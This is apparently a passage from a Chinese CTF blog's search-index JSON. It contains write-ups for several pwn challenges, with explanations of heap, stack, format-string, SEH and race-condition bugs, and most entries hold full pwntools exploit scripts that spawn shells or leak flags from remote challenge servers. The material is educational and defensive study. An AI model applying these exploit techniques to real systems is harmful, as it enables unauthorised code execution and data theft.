&lt;y&gt;/h/q]:&#x27;,&#x27;f 5 48&#x27;)sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 6 48&#x27;)sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;f 8 48&#x27;) sh.sendlineafter(&#x27;[f &lt;x&gt; &lt;y&gt;/h/q]:&#x27;,&#x27;q&#x27;)sh.interactive()","categories":["CTF"],"tags":["栈溢出"]},{"title":"wdb_2018_1st_blind(劫持bss段上的stdout指针来执行任意函数)","url":"/2020/06/10/wdb_2018_1st_blind/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，程序里没有show功能\n\n\n有一个后门函数\n\n\nDelete功能存在UAF，但是delete功能只能用3次，因此劫持_IO_2_1_stdout来泄露libc地址次数不够用。\n\n\n由于got表也不可写，那么我们可以劫持bss段上的stdout指针，将其指向我们伪造的_IO_FILE结构体处，就可以调用backdoor函数了。\n#coding:utf8from pwn import *#sh = process(&#x27;./wdb_2018_1st_blind&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29314)backdoor = 0x00000000004008E3def add(index,content):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;Content:&#x27;,content)def edit(index,content):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;Content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))fake_chunk_in_bss = 0x0000000000601FF5add(0,&#x27;a&#x27;*0x60) #0delete(0)edit(0,p64(fake_chunk_in_bss))add(1,&#x27;a&#x27;*0x60) #1#伪造一个IO_FILEpayload = p64(fake_chunk_in_bss + 0xB)payload += p64(0)payload += p64(fake_chunk_in_bss + 0x10) #vtablepayload += &#x27;\\x00&#x27;*0x3 + p64(fake_chunk_in_bss - 0x78) + p64(backdoor) + &#x27;\\x00&#x27;*0x25 + p64(0x601FF0)add(2,payload) #申请到bss上，篡改stdout指针，伪造IO_FILE，当调用printf时，会getshellsh.interactive()","categories":["CTF"],"tags":["UAF","IO FILE","stdout"]},{"title":"wdb_2018_4th_pwn2(爆破随机数为0)","url":"/2020/07/24/wdb_2018_4th_pwn2/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，功能1栈溢出，但是有canary\n\n\n功能3格式化字符串，当仅能泄露一个值。\n\n\n功能2是一个递归调用，多次递归，可以在栈里多处位置留下canary的值\n\n\n功能9011也是一个栈溢出，但是需要正确的key才能进行。\n\n\n可以使用功能3泄露libc地址，然后功能2递归多次，再使用功能1将canary的值泄露，最后通过爆破随机数，用9011功能来进行栈溢出做ROP。\n随机数可以直接用0来爆破，因为&#x2F;dev&#x2F;urandom随机数也可能产生0，并且爆破失败程序可以继续，而不是崩溃。\n#coding:utf8from pwn import *#sh = process(&#x27;./wdb_2018_4th_pwn2&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)context.log_level = &#x27;debug&#x27;sh = remote(&#x27;node3.buuoj.cn&#x27;,25936)libc = ELF(&#x27;./libc-2.23.so&#x27;)def stack(payload):   sh.sendlineafter(&#x27;option:&#x27;,&#x27;1&#x27;)   sh.sendafter(&#x27;once..&#x27;,payload)def bored(payload,n):   sh.sendlineafter(&#x27;option:&#x27;,&#x27;2&#x27;)   for i in range(n-1):      sh.sendafter(&#x27;bored...&#x27;,&#x27;a&#x27;)      sh.sendlineafter(&#x27;Satisfied?y/n&#x27;,&#x27;n&#x27;)   sh.sendafter(&#x27;bored...&#x27;,payload)   sh.sendlineafter(&#x27;Satisfied?y/n&#x27;,&#x27;y&#x27;)def printf(payload):   sh.sendlineafter(&#x27;option:&#x27;,&#x27;3&#x27;)   sh.sendafter(&#x27;think?)&#x27;,payload)def secret(code):   sh.sendlineafter(&#x27;option:&#x27;,&#x27;9011&#x27;)   sh.sendafter(&#x27;code:&#x27;,code)bored(&#x27;a&#x27;,5)stack(&#x27;a&#x27;*0xA9)sh.recvuntil(&#x27;a&#x27;*0xA9)canary = u64(sh.recv(7).rjust(8,&#x27;\\x00&#x27;))print &#x27;canary=&#x27;,hex(canary)printf(&#x27;%a&#x27;)sh.recvuntil(&#x27;0x0.0&#x27;)libc_base = int(sh.recvuntil(&#x27;p-&#x27;,drop = True),16) - libc.sym[&#x27;_IO_2_1_stdout_&#x27;] - 0x83system_addr = libc_base + libc.sym[&#x27;system&#x27;]pop_rdi = libc_base + 0x0000000000021102pop_rsi = libc_base + 0x00000000000202e8#mov qword ptr [rsi], rdi ; retmov_q_rsi_rdi = libc_base + 0x0000000000123052bss = libc_base + libc.bss()print &#x27;libc_base=&#x27;,hex(libc_base)payload = &#x27;a&#x27;*0x8 + p64(canary) + p64(0) + p64(pop_rdi) + &#x27;cat fl*\\x00&#x27; + p64(pop_rsi) + p64(bss) + p64(mov_q_rsi_rdi)payload += p64(pop_rdi) + p64(bss) + p64(system_addr)payload = payload.ljust(0x1000,&#x27;\\x00&#x27;)bored(payload,1)#爆破随机数为0try:   for i in range(9999):      secret(&#x27;\\x00&#x27;*0x8)except:   sh.close()sh.interactive()","categories":["CTF"],"tags":["栈溢出","格式化字符串漏洞","爆破"]},{"title":"welpwn","url":"/2019/11/06/welpwn/","content":"首先用IDA查看\n\n\n发现主函数不能栈溢出，我们看看echo这个函数\n\n\necho会把主函数输入的字符串复制到局部的s2里，并且s2只有16字节，可以造成溢出。Echo函数先循环复制字符到s2，如果遇到0，就结束复制，然后输出s2。因此，我们如果想直接覆盖函数返回地址，那么我们的目标函数必须没有参数，否则，我们用p64(…)包装地址时，必然会出现0。比如我们的payload为payload &#x3D; ‘a’*0x18 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)由于是64为包装，因此payload字符串为’a’*0x18 + ‘\\xa3\\x08\\x40\\x00\\x00\\x00\\x00\\x00’ + ‘……’这意味着，payload后面的两个地址不会被复制到s2，因为前面遇到了0，那么这样我们就不能正确调用出system(“&#x2F;bin&#x2F;sh”)\n那么，我们来分析一下，该如何达到目的首先，进入echo函数后，栈中数据是这样的\n\n\n假如我们在buf中输入的0x400个a字符，那么栈变成这样了\n\n\n因为没有在中途遇到0，所以echo中的循环一直复制buf中的数据到s2中，造成溢出。现在，假如我们的payload &#x3D; ‘a’*0x18 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)那么，栈中的数据变成这样\n\n\n这样的话，echo执行完后，跳到pop_rdi地址处执行，然而，pop_rdi执行完后，栈顶指针esp指向buf+0x8 ，即aaaaaaaa，这里不是地址，因此程序崩溃结束。然而，如果，我们在buf+0x8处存储其他函数地址，也是不可行的，因为该地址是64位，末尾几位有0，这会导致我们还没溢出s2就已停止数据复制。\n因此，我们有以下总结buf的前24字节不能 存地址数据，只存普通数据。buf+24处应该存某一地址，且该地址处有四个pop指令，和一个retn指令。这样，四次pop后，就相当于跳过了24字节数据和自己本身8字节地址数据。在接下来的地址处，我们就可以写其他函数。\n在0x40089C处正好有四个pop和一个retn\n\n\n假如我们的payload &#x3D; ‘a’*0x18 + p64(pop_24) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)那么栈布局如下\n\n\n那么，echo函数执行完以后，跳到pop_24地址处，由于跳转后，栈顶指针指向buf，出栈4个后，指针指向buf+32 ，接下来遇到retn，出栈一个元素为(pop_rdi)作为pop_24的返回地址，这样跳转到了pop_rdi，后面类似。我们调用system 获取到shell\n我们最终的exp脚本如下:\n#coding:utf8  from pwn import *  from LibcSearcher import *    context.log_level  = &#x27;debug&#x27;  sh = process(&#x27;./pwnh13&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,51867)  elf = ELF(&#x27;./pwnh13&#x27;)  write_got = elf.got[&#x27;write&#x27;]  puts_plt = elf.plt[&#x27;puts&#x27;]  #此处有4条pop指令，用于跳过24字节  pop_24 = 0x40089C  #pop rdi的地址,用来传参，具体看x64的传参方式  pop_rdi = 0x4008A3    sh.recvuntil(&#x27;Welcome to RCTF\\n&#x27;)    main_addr = 0x4007CD  #本题的溢出点在echo函数里,然而，当遇到0，就停止了数据的复制，因此我们需要pop_24来跳过24个字节  payload = &#x27;a&#x27;*0x18 + p64(pop_24) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)    sh.send(payload)    sh.recvuntil(&#x27;\\x40&#x27;)  #泄露write地址  write_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))    libc = LibcSearcher(&#x27;write&#x27;,write_addr)  #获取libc加载地址  libc_base = write_addr - libc.dump(&#x27;write&#x27;)  #获取system地址  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  #获取/bin/sh地址  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)    sh.recvuntil(&#x27;\\n&#x27;)  payload = &#x27;a&#x27;*0x18 + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)    sh.send(payload)  sh.interactive()  \n\n\n","categories":["CTF"],"tags":["栈溢出","ROP"]},{"title":"whctf2017_note_sys(多线程条件竞争漏洞)","url":"/2020/06/11/whctf2017_note_sys/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，delete功能另启了一个线程\n\n\n函数里休眠了2s，在休眠之前,end_ptr减去了8\n\n\n在add函数里，取end_ptr，然后往其指向的地方写一个堆地址。\n\n\n由此，我们可以多次调用delete，每次end_ptr都会减去8并且休眠2s再做判断，这就存在条件竞争，我们可以在判断之前让end_ptr指向got表，然后add的时候就能往got表里写一个堆地址，我们在堆里布下shellcode即可。\n#coding:utf8from pwn import *#sh = process(&#x27;./note_sys&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29522)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)def add(content):   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;0&#x27;)   sh.sendlineafter(&#x27;input your note, no more than 250 characters&#x27;,content)def delete():   sh.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)#条件竞争for i in range(20):   delete()add(asm(shellcraft.sh()))sh.interactive()","categories":["CTF"],"tags":["条件竞争"]},{"title":"whctf2017_stackoverflow(glibc任意地址写一个0字节漏洞利用)","url":"/2020/06/11/whctf2017_stackoverflow/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n输入name的功能可以用于地址泄露\n\n\n在主功能里，存在一个glibc任意地址写入一个0字节的漏洞，我们可以通过malloc一个很大的堆，这样系统调用mmap分配内存，其地址靠近glibc地址，并且偏移固定，这样，我们就能玩glibc里任意地址写一个x00字节，我们可以劫持_IO_2_1_stdin里的IO_buf_base成员低1字节为x00，这样，我们调用scanf的时候，就能控制IO_2_1_stdin结构体，然后，我们将IO_buf_base等成员改成malloc_hook_addr，这样，然后经过多次getc，最后平衡后就scanf可以往malloc_hook_addr处写数据了，写入one_gadget即可。\n\n\n\n\n\nfrom pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)#sh = process(&#x27;./stackoverflow&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26391)sh.sendafter(&#x27;leave your name, bro:&#x27;,&#x27;a&#x27;*0x20)sh.recvuntil(&#x27;a&#x27;*0x20)libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]one_gadget_addr = libc_base + 0xf1147malloc_hook_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)#覆盖stdin的_IO_write_ptr的低1字节为0sh.sendlineafter(&#x27;please input the size to trigger stackoverflow:&#x27;,str(0x6C5908))sh.sendlineafter(&#x27;please input the size to trigger stackoverflow:&#x27;,str(0x300000))raw_input()sh.sendlineafter(&#x27;padding and ropchain:&#x27;,&#x27;haivk&#x27;)sh.sendafter(&#x27;please input the size to trigger stackoverflow:&#x27;,p64(malloc_hook_addr)*2 + p64(malloc_hook_addr + 0x8) + p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8))sh.sendlineafter(&#x27;padding and ropchain:&#x27;,&#x27;haivk&#x27;)for i in range(39):   sh.sendlineafter(&#x27;please input the size to trigger stackoverflow:&#x27;,str(&#x27;1&#x27;))#写malloc_hooksh.sendlineafter(&#x27;please input the size to trigger stackoverflow:&#x27;,p64(one_gadget_addr))sh.interactive()\n\n","categories":["CTF"],"tags":["off by one","IO FILE"]},{"title":"(windows SEH利用)babystack","url":"/2020/07/26/windows_SEH%E5%88%A9%E7%94%A8_babystack/","content":"用IDA分析一下，栈溢出漏洞\n\n\n但是程序结尾不能ret，直接exit了\n\n\n我们注意到，程序开始时，注册了SHE处理\n\n\n当程序发生异常，比如访问非法地址时，将造成异常，如果程序有注册SHE异常处理，则使用相关的handler来处理异常。\npush offset stru_403688压入了一个结构体地址，这个结构体是SEH SCOPE TABLE，它的结构如下\n\n\n其中我们注意到里面有两个函数指针，如果我们能够伪造一个这样的结构体，并把函数指针指向后门函数，就可以达到目的。\npush offset __except_handler4压入了一个异常处理的handler，如果程序没有开启SAFE SHE，那么我们不需要伪造SEH SCOPE TABLE，直接覆盖这个handler指针为后门函数地址即可，但是如果开启了SAFE SHE，那么程序会检测hanlder是否在某一个合法的范围内，就如glibc下面的vtable范围检查一样。因此，在SAFE SHE下，我们可以通过伪造SEH SCOPE TABLE来达到利用。\n__except_handler4的源码如下\nvoid __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)&#123;    unsigned int v3; // esi@2    unsigned int v4; // esi@3    if ( scopeTable-&gt;GSCookieOffset != -2 )    &#123;        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];        __guard_check_icall_fptr(cookieCheckFunction);        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);    &#125;    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];    __guard_check_icall_fptr(cookieCheckFunction);    ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);&#125;int __cdecl _except_handler4_common(unsigned int *securityCookies, void (__fastcall *cookieCheckFunction)(unsigned int), _EXCEPTION_RECORD *exceptionRecord, unsigned __int32 sehFrame, _CONTEXT *context)&#123;    // 异或解密 scope table    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + 8));    // sehFrame 等于  ebp - 10h 位置, framePointer 等于上图 ebp 的位置    framePointer = (char *)(sehFrame + 16);    scopeTable = scopeTable_1;    // 验证 GS    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (char *)(sehFrame + 16));    __except_validate_context_record(context);    if ( exceptionRecord-&gt;ExceptionFlags &amp; 0x66 )    &#123;        ......    &#125;    else    &#123;        exceptionPointers.ExceptionRecord = exceptionRecord;        exceptionPointers.ContextRecord = context;        tryLevel = *(_DWORD *)(sehFrame + 12);        *(_DWORD *)(sehFrame - 4) = &amp;exceptionPointers;        if ( tryLevel != -2 )        &#123;            while ( 1 )            &#123;                v8 = tryLevel + 2 * (tryLevel + 2);                filterFunc = (int (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((char *)scopeTable_1 + 4 * v8);                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;                scopeTableRecord_1 = scopeTableRecord;                if ( filterFunc )                &#123;                    // 调用 FilterFunc                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);                    ......                    if ( filterFuncRet &gt; 0 )                    &#123;                        ......                        // 调用 HandlerFunc                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + 16);                        ......                    &#125;                &#125;                ......                tryLevel = encloseingLevel;                if ( encloseingLevel == -2 )                    break;                scopeTable_1 = scopeTable;            &#125;            ......        &#125;    &#125;  ......&#125;\n\n从__except_handler4源码中，我们看到，我们只需要伪造好了*FilterFunc，*即可执行相应的函数。\nxor [ebp+ms_exc.registration.ScopeTable], eax会将栈里的SHE ScopeTable指针与___security_cookie进行加密，因此，我们伪造SHE ScopeTable指针时，也需要加密一遍。我们仅需要修改栈里scopeTbale指针，而不要把其他的SHE帧里其他的给改了，sehFrame 的结构如下\n\n\n大小为0x18，从IDA的F5中也可以发现\n\n\n从__except_handler4的源码中看到，还有一个ValidateLocalCookies函数对cookie的验证，类似于linux下的canary验证，我们只需要调试，确定好其位置，然后计算其值，写入即可。\n#coding:utf8from pwn import *#sh = remote(&#x27;192.168.232.1&#x27;,6666)sh = remote(&#x27;node3.buuoj.cn&#x27;,26098)def get_data(addr):   sh.sendlineafter(&#x27;Do you want to know more?&#x27;,&#x27;yes&#x27;)   sh.sendlineafter(&#x27;Where do you want to know&#x27;,str(addr))   sh.recvuntil(&#x27;value is &#x27;)   data = int(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True),16)   return datash.recvuntil(&#x27;stack address = &#x27;)stack_addr = int(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True),16)print &#x27;stack_addr=&#x27;,hex(stack_addr)sh.recvuntil(&#x27;main address = &#x27;)exe_base = int(sh.recvuntil(&#x27;\\r\\n&#x27;,drop = True),16) - 0x10B0backdoor = exe_base + 0x138Dsecurity_cookie_addr = exe_base + 0x4004print &#x27;exe_base=&#x27;,hex(exe_base)print &#x27;backdoor=&#x27;,hex(backdoor)print &#x27;security_cookie_addr=&#x27;,hex(security_cookie_addr)security_cookie = get_data(security_cookie_addr)print &#x27;security_cookie=&#x27;,hex(security_cookie)#伪造SEH SCOPE TABLESEH_scope_table = p32(0xFFFFFFE4) #GSCookieOffsetSEH_scope_table += p32(0) #GSCookieXorOffsetSEH_scope_table += p32(0xFFFFFF20) #EHCookieOffsetSEH_scope_table += p32(0) #EHCookieXorOffsetSEH_scope_table += p32(0xFFFFFFFE) #EncloseingLevelSEH_scope_table += p32(backdoor) #FilterFunc，伪造为后门函数地址SEH_scope_table += p32(0) #HandlerFuncpayload = &#x27;a&#x27;*0x10 + SEH_scope_tablefake_SEH_scope_table_addr = stack_addr + 0x10payload= payload.ljust(0x80,&#x27;a&#x27;)payload += p32((stack_addr + 0x9C) ^ security_cookie) #ValidateLocalCookies的校验#CPPEH_RECORD结构体payload += p32(stack_addr - 0x44) #esppayload += p32(0)payload += p32(stack_addr + 0xD4) #Nextpayload += p32(exe_base + 0x1460) #ExceptionHandlerpayload += p32(fake_SEH_scope_table_addr ^ security_cookie) #Scope Tablepayload += p32(0) #TryLevelsh.sendlineafter(&#x27;Do you want to know more?&#x27;,&#x27;n&#x27;)sh.sendline(payload)sh.sendlineafter(&#x27;Do you want to know more?&#x27;,&#x27;yes&#x27;)sh.sendlineafter(&#x27;Where do you want to know&#x27;,&#x27;1&#x27;) #地址异常触发SEH调用我们的后门函数sh.interactive()","categories":["CTF"],"tags":["栈溢出","windows漏洞利用","异常"]},{"title":"Wuda","url":"/2020/02/12/wuda/","content":"首先，我们检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n是一个类似于服务器的程序，监听了本地端口1337\n\n\n看起来很复杂，当我们的关注点不在这\n\n\n我们的关注点在这，当数据包满足一定的条件后，就能调出菜单。\n\n\n菜单里是经典的增删改查操作\n\n\n堆的大小没有限制，最多可以保存10个堆指针。\n\n\n经过分析，我们发现节点的结构体是这样的\ntypedef struct Node &#123;        int64_t size;        char *content;    &#125;; \n\nmalloc的顺序是这样的\nNode *node = (Node *)malloc(sizeof(Node))  node-&gt;size = size;  node-&gt;content = (char *)malloc(sizeof(char)*size)  \n\n[edit功能存在一个off by one漏洞]{.mark}，能够溢出一个字节数据\n\n\nshow功能不存在漏洞\n\n\ndelete功能不存在UAF漏洞\n\n\n解题思路\n构造这样的堆布局\n\n\nchunk3需要借位到chunk4通过chunk3的off by one，控制chunk4堆块的size的prev_inuse位为0，代表前一个相邻块为free的状态，在content2的末尾8字节，伪造prev_size为0、1、2、3的总大小\n\n\n释放chunk4后，出现了上图的布局，绿色区域的表示都被合并到了chunk0\n我们知道**[，node结构体里有一个content指针，我们能够控制这个指针，就能实现任意地址读写]{.mark}**,我们只需malloc一个大于等于0xA0的堆，就能够控制整个node1了，就能轻而易举的修改node1的content指针\n实现了任意地址的读写，[本题我们写了free_hook或者malloc_hook以后还没有完事]{.mark}，本题是一个服务器端程序，我们简单的getshell，只会在服务器上弹出shell并且socat只对端口做了转发，不像其他类型的pwn是由socat重定向0和1。因此，[我们还需要手动把0和1重定向到socket的fd中去，这样，我们才能在我们这边得到shell。]{.mark}\n我们既然已经实现了任意地址读写，那么我们不如写ROP到某函数的返回处的栈地址处。利用ROP，我们可以调用dup2函数来重定向0和1文件描述符到socket的文件描述符，也可以mprotect一块RWX的内存，跳过去执行，这里我选择的是直接ROP执行dup2函数。\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    sh = remote(&#x27;127.0.0.1&#x27;,1337)  #sh = remote(&#x27;127.0.0.1&#x27;,2333)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  pop_rdi = 0x4092c3  #pop rsi ; pop r15 ; ret  pop_rsi = 0x4092c1  malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]  system_s = libc.sym[&#x27;system&#x27;]  dup2_s = libc.sym[&#x27;dup2&#x27;]  binsh_s = libc.search(&#x27;/bin/sh&#x27;).next()  #借助environ，我们可以得到栈地址  environ = libc.symbols[&#x27;environ&#x27;]    def init_connect():     #magic     sh.send(&#x27;RPCM&#x27;)     sh.send(p32(0x10))     sh.send(p32(0))     #发送-1，网络序是大端，因此我们逆序     sh.send(p32(0x100000000-1)[::-1])    def create(size,content):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Size:&#x27;,str(size))     sh.sendafter(&#x27;Content:&#x27;,content)    def edit(index,content):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Index:&#x27;,str(index))     sh.sendafter(&#x27;Content: &#x27;,content)    def show(index):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;Index :&#x27;,str(index))      def delete(index):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;4&#x27;)     sh.sendlineafter(&#x27;Index :&#x27;,str(index))    init_connect()  #=====这个骚操作，是为了让以后申请的块能够连续===  create(0x1000,&#x27;\\x00&#x27;*0x1000)  create(0x1000,&#x27;\\x00&#x27;*0x1000)  delete(0)  delete(1)  #===============================================    #unsorted bin范围的chunk，用于泄露libc指针  create(0x80,&#x27;a&#x27;*0x80) #0  create(0x10,&#x27;b&#x27;*0x10) #1  create(0x80,&#x27;c&#x27;*0x80) #2  create(0x20,&#x27;d&#x27;*0x20) #3  create(0x20,&#x27;e&#x27;*0x20) #4    delete(0)  create(0x80,&#x27;\\n&#x27;)  #泄露libc指针  show(0)  sh.recvuntil(&#x27;Content : &#x27;)  main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  system_addr = libc_base + system_s  binsh_addr = libc_base + binsh_s  environ_addr = libc_base + environ  dup2_addr = libc_base + dup2_s  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  print &#x27;binsh_addr=&#x27;,hex(binsh_addr)  print &#x27;dup2_addr=&#x27;,hex(dup2_addr)  #=============这里的操作，是为了让chunk0、2、3的数据域相邻，而chunk1结构体和数据则处于0和2之间，这样，我们利用off by one，控制chunk3的size=====  delete(2)  delete(3)  create(0x18,&#x27;c&#x27;*0x18) #2  delete(4)  create(0x80,&#x27;d&#x27;*0x80) #3  #============================  #现在chunk2 off by one，覆盖chunk1的size的低一字节  #使得prev_size = 0xE0,prev_inuse位为0，这样我们就可以向前合并  edit(2,&#x27;c&#x27;*0x10 + p64(0xF0) + p8(0x90))  delete(0)  #向前合并  delete(3)    create(0xA0,&#x27;a&#x27;*0x80) #0  #现在节点1的结构体重合到了节点0的数据域末尾，我们可以修改了，我们将节点1的结构体内的数据域指针指向我们需要的地址，实现任意地址读写  #现在，我们要泄露栈地址，我们就把指针指向environ  payload = &#x27;a&#x27;*0x80 + p64(0x90) + p64(0x21) + p64(0x10) + p64(environ_addr)  edit(0,payload)  #泄露栈地址  show(1)  sh.recvuntil(&#x27;Content : &#x27;)  stack_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))  #计算出fd存放的位置  fd_addr = stack_addr - 0x77C  print &#x27;fd_addr=&#x27;,hex(fd_addr)  #泄露fd  payload = &#x27;a&#x27;*0x80 + p64(0x90) + p64(0x21) + p64(0x4) + p64(fd_addr)  edit(0,payload)  show(1)  sh.recvuntil(&#x27;Content : &#x27;)  fd = u32(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(4,&#x27;\\x00&#x27;))  print &#x27;fd=&#x27;,hex(fd)  #计算ROP写入的位置，即写到edit函数的返回地址存放处即可  rop_addr = stack_addr - 0x740  #dup(fd,0)  rop = p64(pop_rdi) + p64(fd) + p64(pop_rsi) + p64(0) * 2 + p64(dup2_addr)  #dup(fd,1)  rop += p64(pop_rdi) + p64(fd) + p64(pop_rsi) + p64(1) * 2 + p64(dup2_addr)  #system(&#x27;/bin/sh&#x27;)  rop += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)    #指向rop_addr，然后写ROP  payload = &#x27;a&#x27;*0x80 + p64(0x90) + p64(0x21) + p64(len(rop)) + p64(rop_addr)  edit(0,payload)  edit(1,rop)    sh.interactive()  ","categories":["CTF"],"tags":["ROP","shellcode","off by one"]},{"title":"xman_2019_format(非栈上格式化字符串仅一次利用的爆破)","url":"/2020/04/30/xman_2019_format/","content":"首先检查一下程序的保护机制\n\n\n然后用IDA分析一下\n存在一个后门函数\n\n\ns执行的内存是非栈上，这类格式化字符串漏洞，一般需要先泄露栈地址，但是这里无法做到，如果泄露了，第二次也没机会来再次利用了。因为这里是一次输入，分步执行。没有循环的交互。因此，最简单的方法是爆破栈的低1字节。通过栈上已有的数据，在栈上布下一个指向函数返回地址栈的指针，然后劫持返回地址栈。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./xman_2019_format&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27216)elf = ELF(&#x27;./xman_2019_format&#x27;)backdoor = 0x080485AB#假设$14栈的数据低一字节为0x98，则爆破，成功率1/16，实际上几率更高stack_guess = 0x98#修改$18为$30-0x4C，也就是函数返回地址值payload = &#x27;%&#x27; + str(stack_guess-0x4C) + &#x27;c%10$hhn|&#x27;#在栈上$31布置printf的got低2字节地址payload += &#x27;%&#x27; + str(backdoor &amp; 0xFFFF) + &#x27;c%18$hn|&#x27;sh.sendafter(&#x27;...&#x27;,payload)sh.interactive()\n","categories":["CTF"],"tags":["格式化字符串漏洞","爆破"]},{"title":"xman_2019_nooocall","url":"/2020/04/30/xman_2019_nooocall/","content":"首先，检查一下程序的保护机制\n\n\n沙箱机制禁用了所有的系统调用\n\n\n然后，我们用IDA分析一下，我们可以输入并执行16字节shellcode。然后问题在于系统调用全部被禁用。\n\n\n\n\n程序一开始的时候使用了fopen打开了flag，并且将flag读取到了内存里。然后，当执行shellcode的时候，我们发现，栈里有FILE结构体的地址。\n\n\nFILE是带有缓冲区的，文件flag的内容会被缓冲在内存里。\n\n\n因此，我们可以写一个盲注的shellcode，将字符一个一个的猜测比较。\nmov rax,[rsp+0x10]mov rax,[rax+0x18]mov al,byte ptr[rax+%d]cmp al,%djz $-0x2\n\n如果满足猜对了，jz就会跳会到cmp处，这样一直处于一个死循环，我们就可以延迟来判断是否猜对，猜对了，程序就不会崩溃。\n#coding:utf8from pwn import *import timecontext(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level = &#x27;critical&#x27;)#flag里面可能出现的字符possible_char = []#字符的顺序可以影响效率，让频率最高的字符放前面for x in range(0,10):   possible_char.append(str(x))for x in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)+1):   possible_char.append(chr(x))possible_char.append(&#x27;&#123;&#x27;)possible_char.append(&#x27;-&#x27;)possible_char.append(&#x27;&#125;&#x27;)possible_char.append(&#x27;\\x00&#x27;)OK = Falseflag = &#x27;&#x27;index = 0while not OK:   print &#x27;guess (&#x27;,index,&#x27;) char&#x27;   length = len(flag)   for guess_char in possible_char:      #sh = process(&#x27;./xman_2019_nooocall&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,28942)      #盲注，如果猜对了，程序会处于一个死循环      shellcode_blind = asm(&#x27;&#x27;&#x27;mov rax,[rsp+0x10]                               mov rax,[rax+0x18]                               mov al,byte ptr[rax+%d]                               cmp al,%d                               jz $-0x2                            &#x27;&#x27;&#x27; % (index,ord(guess_char)))      sh.sendlineafter(&#x27;Your Shellcode &gt;&gt;&#x27;,shellcode_blind)      start = time.time()      sh.can_recv_raw(timeout = 